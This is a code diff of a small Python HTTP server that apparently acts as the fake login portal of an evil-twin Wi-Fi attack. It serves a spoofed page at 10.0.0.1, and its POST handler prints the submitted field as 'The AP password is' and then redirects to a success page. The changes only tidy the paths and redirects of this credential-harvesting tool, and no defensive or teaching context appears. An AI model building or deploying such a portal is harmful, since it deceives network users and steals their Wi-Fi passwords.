@@ -11,7 +11,12 @@ PORT_NUMBER = 80
 class login_server(BaseHTTPRequestHandler):
     # Handler for the GET requests
     def do_GET(self):
-        self.path = "/index.html"
+        if self.path=="/":
+            self.path="/index.html"
+
+        if self.path=="/success":
+            self.path="/success.html"
+
         try:
             # Check the file extension required and
             # set the right mime type
@@ -22,8 +27,8 @@ class login_server(BaseHTTPRequestHandler):
             if self.path.endswith(".jpg"):
                 mimetype = 'image/jpg'
                 sendReply = True
-            if self.path.endswith(".gif"):
-                mimetype = 'image/gif'
+            if self.path.endswith(".png"):
+                mimetype = 'image/png'
                 sendReply = True
             if self.path.endswith(".js"):
                 mimetype = 'application/javascript'
@@ -44,12 +49,12 @@ class login_server(BaseHTTPRequestHandler):
 
         except IOError:
             self.send_response(301)
-            self.send_header('Location','http:10.0.0.1:80/')
+            self.send_header('Location','http://10.0.0.1/')
             self.end_headers()
 
     # Handler for the POST requests
     def do_POST(self):
-        if self.path == "/login":
+        if self.path == "/success":
             form = cgi.FieldStorage(
                 fp=self.rfile,
                 headers=self.headers,
@@ -58,10 +63,9 @@ class login_server(BaseHTTPRequestHandler):
             )
 
             print "The AP password is: %s" % form["password"].value
-            self.send_response(200)
+            self.send_response(301)
+            self.send_header('Location','http://10.0.0.1/success')
             self.end_headers()
-            self.wfile.write("Login Successful!")
-
 try:
     # Create a web server and define the handler to manage the
     # incoming request
